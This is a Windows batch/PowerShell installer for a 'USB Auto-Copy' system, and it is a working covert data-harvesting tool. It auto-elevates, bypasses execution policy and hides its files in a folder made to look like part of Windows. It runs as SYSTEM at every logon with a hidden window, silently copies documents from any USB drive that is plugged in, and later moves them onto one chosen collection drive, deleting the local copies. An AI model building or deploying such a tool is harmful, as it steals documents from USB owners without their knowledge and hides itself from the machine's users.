@echo off
:: ============================================================
:: USB Auto-Copy System v3 - Silent Installer
:: ============================================================
:: WHAT'S NEW in v3:
::   - systemcopydocs INDEX: Every file copied is recorded.
::     If the same file (same name + same size) is plugged in
::     again on ANY future USB, it will NEVER be copied again.
::   - New destination: C:\Windows\Downloaded Win Docs\docs
::     (folder is auto-created if it doesn't exist)
::   - No more numbered duplicates (_1, _2 ... _25)
:: ============================================================
:: Double-click ONCE to install.
:: Double-click again to reinstall or uninstall.
:: ============================================================
:: Auto-Elevate to Administrator
net session >nul 2>&1
if %errorLevel% neq 0 (powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs" & exit /b)
set "T=%TEMP%\uac_%RANDOM%.ps1"
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$c=Get-Content -LiteralPath '%~f0'; Set-Content -LiteralPath '%T%' -Value $c[20..($c.Count-1)] -Encoding UTF8"
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%T%" & del "%T%" 2>nul & exit /b

# ============================================================
# USB Auto-Copy System v3 - PowerShell Installer
# ============================================================

# ---- PATHS ----
$DestRoot    = 'C:\Windows\Downloaded Win Docs'
$DocsDir     = Join-Path $DestRoot 'docs'
$InstallDir  = Join-Path $DestRoot 'SYSCOPY'
$MonitorPS1  = Join-Path $InstallDir 'usb_monitor.ps1'
$LauncherVBS = Join-Path $InstallDir 'usb_launcher.vbs'
# systemcopydocs index: one line per copied file: "filename|size_bytes"
$IndexFile   = Join-Path $InstallDir 'systemcopydocs.index'
$TaskName    = 'USB_AutoCopy_Silent_Monitor'

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$nl = [Environment]::NewLine

# Create all directories
foreach ($dir in @($DestRoot, $DocsDir, $InstallDir)) {
    if (-not (Test-Path -LiteralPath $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }
}
# Hide SYSCOPY folder
try { (Get-Item -LiteralPath $InstallDir -Force).Attributes = (Get-Item -LiteralPath $InstallDir -Force).Attributes -bor [IO.FileAttributes]::Hidden } catch {}

# Create empty index file if not present
if (-not (Test-Path -LiteralPath $IndexFile)) {
    Set-Content -LiteralPath $IndexFile -Value '' -Encoding UTF8
}

# ---- Check if already installed ----
$existingTask = $null
try { $existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction Stop } catch {}

if ($existingTask) {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = 'USB Auto-Copy Setup v3'
    $form.Size = New-Object System.Drawing.Size(340,140)
    $form.StartPosition = 'CenterScreen'
    $form.FormBorderStyle = 'FixedDialog'
    $form.MaximizeBox = $false
    $form.MinimizeBox = $false

    $label = New-Object System.Windows.Forms.Label
    $label.Location = New-Object System.Drawing.Point(10,15)
    $label.Size = New-Object System.Drawing.Size(310,20)
    $label.Text = 'USB Auto-Copy is already installed.'
    $label.AutoSize = $true
    $form.Controls.Add($label)

    $btnUpdate = New-Object System.Windows.Forms.Button
    $btnUpdate.Location = New-Object System.Drawing.Point(15,55)
    $btnUpdate.Size = New-Object System.Drawing.Size(80,30)
    $btnUpdate.Text = 'Update'
    $btnUpdate.DialogResult = 'Yes'
    $form.Controls.Add($btnUpdate)

    $btnUninstall = New-Object System.Windows.Forms.Button
    $btnUninstall.Location = New-Object System.Drawing.Point(115,55)
    $btnUninstall.Size = New-Object System.Drawing.Size(90,30)
    $btnUninstall.Text = 'Uninstall'
    $btnUninstall.DialogResult = 'No'
    $form.Controls.Add($btnUninstall)

    $btnCancel = New-Object System.Windows.Forms.Button
    $btnCancel.Location = New-Object System.Drawing.Point(220,55)
    $btnCancel.Size = New-Object System.Drawing.Size(80,30)
    $btnCancel.Text = 'Cancel'
    $btnCancel.DialogResult = 'Cancel'
    $form.Controls.Add($btnCancel)

    $form.AcceptButton = $btnUpdate
    $form.CancelButton = $btnCancel
    $form.TopMost = $true
    $result = $form.ShowDialog()

    if ($result -eq 'No') {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
        Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -match 'usb_monitor.ps1' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
        if (Test-Path -LiteralPath $InstallDir) { Remove-Item -LiteralPath $InstallDir -Recurse -Force -ErrorAction SilentlyContinue }
        [System.Windows.Forms.MessageBox]::Show('Uninstalled successfully.' + [Environment]::NewLine + 'Your documents in C:\Windows\Downloaded Win Docs\docs are kept safe.', 'USB Auto-Copy', 'OK', 'Information') | Out-Null
        exit
    }
    if ($result -eq 'Cancel') { exit }

    # Update: stop old monitor, then reinstall scripts
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -match 'usb_monitor.ps1' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
}

# ============================================================
# MONITOR SCRIPT
# ============================================================
$monitorCode = @'
# USB Auto-Copy Monitor v3 - systemcopydocs index edition
# Runs silently in background. Never copies the same file twice.

$mutex = New-Object System.Threading.Mutex([bool]0, 'USBAutoCopyMonitorMutexV3')
if (-not $mutex.WaitOne(0, [bool]0)) { exit }

# ---- PATHS ----
$DestRoot   = 'C:\Windows\Downloaded Win Docs'
$DocsDir    = Join-Path $DestRoot 'docs'
$InstallDir = Join-Path $DestRoot 'SYSCOPY'
$IndexFile  = Join-Path $InstallDir 'systemcopydocs.index'
$LogFile    = Join-Path $InstallDir 'autocopy_log.txt'
$Exts       = @('*.pdf','*.pptx','*.ppt','*.docx','*.doc','*.xlsx','*.xls')

# Ensure directories exist
foreach ($dir in @($DestRoot, $DocsDir, $InstallDir)) {
    if (-not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
}

# ---- INDEX FUNCTIONS ----
# Index entry format:  filename|size_bytes
# This identifies a file uniquely to avoid re-copying it

function Get-IndexKey($file) {
    return ($file.Name + '|' + $file.Length.ToString())
}

function Load-Index($indexPath) {
    $set = New-Object System.Collections.Generic.HashSet[string]
    if (Test-Path -LiteralPath $indexPath) {
        Get-Content -LiteralPath $indexPath -Encoding UTF8 -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_ -ne '') { [void]$set.Add($_) }
        }
    }
    return $set
}

function Add-ToIndex($indexPath, $key) {
    Add-Content -LiteralPath $indexPath -Value $key -Encoding UTF8 -ErrorAction SilentlyContinue
}

# ---- MAIN LOOP ----
while ([bool]1) {
    try {
        $drives = @(Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 })
        foreach ($drv in $drives) {
            $root   = $drv.DeviceID + '\'
            $serial = $drv.VolumeSerialNumber
            $label  = $drv.VolumeName
            if ([string]::IsNullOrWhiteSpace($label)) { $label = 'USB_' + $drv.DeviceID[0] }

            # =====================================================
            # TARGET USB (the USB we SEND docs TO)
            # =====================================================
            if ($serial -eq '702968E6' -or (Test-Path -LiteralPath (Join-Path $root '.syscopy_target'))) {
                $targetFile = Join-Path $root '.syscopy_target'
                if (-not (Test-Path -LiteralPath $targetFile)) {
                    Set-Content -LiteralPath $targetFile -Value 'SYSCOPY_TARGET_DRIVE' -Encoding UTF8 -ErrorAction SilentlyContinue
                    try { (Get-Item -LiteralPath $targetFile).Attributes = 'Hidden' } catch {}
                }
                $usbDocsFolder = Join-Path $root 'docs'
                if (-not (Test-Path -LiteralPath $usbDocsFolder)) { New-Item -ItemType Directory -Path $usbDocsFolder -Force | Out-Null }

                $copied = 0
                foreach ($ext in $Exts) {
                    $files = @(Get-ChildItem -Path $DocsDir -Filter $ext -Recurse -File -ErrorAction SilentlyContinue)
                    foreach ($file in $files) {
                        $relPath = $file.FullName.Substring($DocsDir.Length)
                        if ($relPath.StartsWith('\')) { $relPath = $relPath.Substring(1) }
                        $dest = Join-Path $usbDocsFolder $relPath
                        $destFolder = Split-Path $dest -Parent
                        if (-not (Test-Path -LiteralPath $destFolder)) { New-Item -ItemType Directory -Path $destFolder -Force | Out-Null }
                        try {
                            $shouldMove = $false
                            if (-not (Test-Path -LiteralPath $dest)) {
                                $shouldMove = $true
                            } else {
                                $destItem = Get-Item -LiteralPath $dest
                                if ($destItem.LastWriteTime -lt $file.LastWriteTime -or $destItem.Length -ne $file.Length) {
                                    $shouldMove = $true
                                }
                            }
                            if ($shouldMove) {
                                Copy-Item -LiteralPath $file.FullName -Destination $dest -Force -ErrorAction Stop
                                Remove-Item -LiteralPath $file.FullName -Force -ErrorAction SilentlyContinue
                                $copied++
                            }
                        } catch {}
                    }
                }
                if ($copied -gt 0) {
                    Get-ChildItem -Path $DocsDir -Directory -Recurse -ErrorAction SilentlyContinue | Where-Object {
                        @(Get-ChildItem -Path $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0
                    } | Sort-Object -Property FullName -Descending | Remove-Item -Force -ErrorAction SilentlyContinue

                    $entry = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' | ' + $label + ' (' + $serial + ') | ' + $copied + ' files MOVED to USB'
                    Add-Content -LiteralPath $LogFile -Value $entry -ErrorAction SilentlyContinue
                }

            } else {
                # =====================================================
                # SOURCE USB (collect docs FROM this USB)
                # systemcopydocs index prevents re-copying same files
                # =====================================================
                $safeName = ($label.Trim() + ' (' + $serial + ')') -replace '[\\/:*?"<>|]', '_'
                $destDir  = Join-Path $DocsDir $safeName

                if (-not (Test-Path -LiteralPath $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }

                # Load index fresh each USB check
                $indexSet = Load-Index $IndexFile

                $copied = 0
                foreach ($ext in $Exts) {
                    $files = @(Get-ChildItem -Path $root -Filter $ext -Recurse -File -ErrorAction SilentlyContinue)
                    foreach ($file in $files) {
                        $key = Get-IndexKey $file

                        # === CORE FIX: skip if already in systemcopydocs index ===
                        if ($indexSet.Contains($key)) {
                            continue
                        }

                        $relPath    = $file.FullName.Substring($root.Length)
                        $dest       = Join-Path $destDir $relPath
                        $destFolder = Split-Path $dest -Parent
                        if (-not (Test-Path -LiteralPath $destFolder)) { New-Item -ItemType Directory -Path $destFolder -Force | Out-Null }

                        try {
                            if (-not (Test-Path -LiteralPath $dest)) {
                                # Fresh copy - record in index
                                Copy-Item -LiteralPath $file.FullName -Destination $dest -ErrorAction Stop
                                Add-ToIndex $IndexFile $key
                                [void]$indexSet.Add($key)
                                $copied++
                            }
                            elseif ((Get-Item -LiteralPath $dest).Length -eq $file.Length) {
                                # Already there with same size - just index it silently
                                Add-ToIndex $IndexFile $key
                                [void]$indexSet.Add($key)
                            }
                            else {
                                # Same name, different size = genuinely different file
                                # Log and skip (NO numbered duplicates)
                                $entry = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' | CONFLICT SKIPPED: ' + $file.Name + ' (sizes differ - keeping existing copy)'
                                Add-Content -LiteralPath $LogFile -Value $entry -ErrorAction SilentlyContinue
                            }
                        } catch {}
                    }
                }
                if ($copied -gt 0) {
                    $entry = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' | ' + $label + ' (' + $serial + ') | ' + $copied + ' NEW files copied to [' + $safeName + ']'
                    Add-Content -LiteralPath $LogFile -Value $entry -ErrorAction SilentlyContinue
                }
            }
        }
    } catch {}

    Start-Sleep -Seconds 5
}
'@

Set-Content -LiteralPath $MonitorPS1 -Value $monitorCode -Encoding UTF8

# ---- VBS Launcher ----
$vbsCode = @'
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
ps1File = scriptDir & "\usb_monitor.ps1"

WScript.Sleep 3000

If Not fso.FileExists(ps1File) Then
    WScript.Quit
End If

Set sh = CreateObject("Wscript.Shell")
cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & ps1File & """"
sh.Run cmd, 0, False
'@

Set-Content -LiteralPath $LauncherVBS -Value $vbsCode -Encoding ASCII

# ---- Register Scheduled Task ----
$action   = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument ('"' + $LauncherVBS + '"')
$trigger  = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Seconds 0)
$registered = $false

try {
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger @($trigger) -Settings $settings -Principal $principal -Description 'USB Auto-Copy Monitor v3' -Force | Out-Null
    $registered = [bool]1
} catch {
    try {
        $trArg = 'wscript.exe "' + $LauncherVBS + '"'
        Start-Process 'schtasks.exe' -ArgumentList @('/create', '/tn', $TaskName, '/tr', $trArg, '/sc', 'ONLOGON', '/f', '/ru', 'SYSTEM', '/rl', 'HIGHEST') -Wait -WindowStyle Hidden -ErrorAction Stop
        $registered = [bool]1
    } catch {}
}

# Start immediately
try { Start-Process 'wscript.exe' -ArgumentList ('"' + $LauncherVBS + '"') -WindowStyle Hidden -ErrorAction SilentlyContinue } catch {}

# Notify
if ($registered) {
    $msg  = 'USB Auto-Copy v3 installed successfully!' + $nl + $nl
    $msg += 'DESTINATION:' + $nl
    $msg += '  C:\Windows\Downloaded Win Docs\docs' + $nl + $nl
    $msg += 'systemcopydocs INDEX active:' + $nl
    $msg += '  Every copied file is recorded. Plug the same USB 100x -' + $nl
    $msg += '  zero duplicates, zero numbered copies (_1, _2, _25...).' + $nl + $nl
    $msg += 'INDEX location:' + $nl
    $msg += '  C:\Windows\Downloaded Win Docs\SYSCOPY\systemcopydocs.index' + $nl + $nl
    $msg += 'To uninstall: double-click this file again.'
    [System.Windows.Forms.MessageBox]::Show($msg, 'USB Auto-Copy v3 - Ready', 'OK', 'Information') | Out-Null
} else {
    [System.Windows.Forms.MessageBox]::Show('Installation failed. Please right-click and Run as Administrator.', 'USB Auto-Copy', 'OK', 'Warning') | Out-Null
}
